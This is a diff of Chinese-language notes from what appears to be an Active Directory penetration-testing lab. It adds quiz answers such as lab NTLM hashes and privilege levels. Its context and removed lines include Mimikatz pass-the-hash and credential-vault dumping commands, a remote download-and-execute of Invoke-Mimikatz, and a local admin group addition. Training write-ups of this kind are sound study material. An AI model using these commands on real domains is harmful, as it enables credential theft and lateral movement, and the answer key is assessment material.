@@ -133,9 +133,7 @@ RDPUsers
 
 ## 域中所有用户
 ```
-PS C:\AD> get-netuser |selec
-
-cn
+PS C:\AD> get-netuser |select cn
 --
 Administrator
 Guest
@@ -581,7 +579,7 @@ eurocorp.local dollarcorp.moneycorp.local    External  Bidirectional
 答案：Bidirectional（双向信任）
 
 
-# Learning Objective - 5（1）
+# Learning Objective - 5
 
 ## Task
 
@@ -758,7 +756,6 @@ ServiceAbused  Command
 AbyssWebServer net localgroup Administrators dcorp\student366 /add
 ```
 
-# Learning Objective - 5（2）
 
 查找本地管理员可以用powershell远程登录的电脑
 ```
@@ -819,7 +816,7 @@ Tunnel adapter isatap.{5A335808-BE49-450F-AFA2-F08ED9EF5EEF}:
    Connection-specific DNS Suffix  . :
 ```
 
-# Learning Objective - 5（3）
+
 
 在未登陆的情况下，可以通过下面页面查看有什么账号
 ```http://172.16.3.11:8080/asynchpeople/```
@@ -836,7 +833,7 @@ Jenkins 登录账号信息是：
 问题：Jenkins user used to access Jenkins web console
 答案：builduser
 
-# Learning Objective - 5（4）
+
 
 
 Jenkins特权提升，可以通过两种方法
@@ -1799,16 +1796,25 @@ Bye!
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local  /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
 ```
 
+问题：Process using svcadmin as service account
+答案：sqlserver.exe
 
-Enter-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
+问题：NTLM hash of svcadmin account
+答案：b38ff50264b74508085d82c69794a4d8
+
+问题：We tried to extract clear-text credentials for scheduled tasks from? Flag value is like lsass, registry, credential vault etc.
+答案：credential vault
+
+问题：NTLM hash of srvadmin extracted from dcorp-adminsrv
+答案：a98e18228819e8eec3dfa33cb68b0728
+
+问题：NTLM hash of websvc extracted from dcorp-adminsrv
+答案：cc098f204c5887eaa8253e7c2749156f
 
 
-iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
+问题：NTLM hash of appadmin extracted from dcorp-adminsrv
+答案：d549831a955fee51a43c83efb3928fa7
 
-
-Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
-
-Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 
 
 # Learning Objective - 8
@@ -4744,8 +4750,9 @@ eu-sql
 答案：sqluser
 
 问题：SQL Server privileges on eu-sql
-答案：
+答案：Sysadmin
 
 问题：Privileges on operating system of eu-sql
 答案：nt authority\network service
+
 
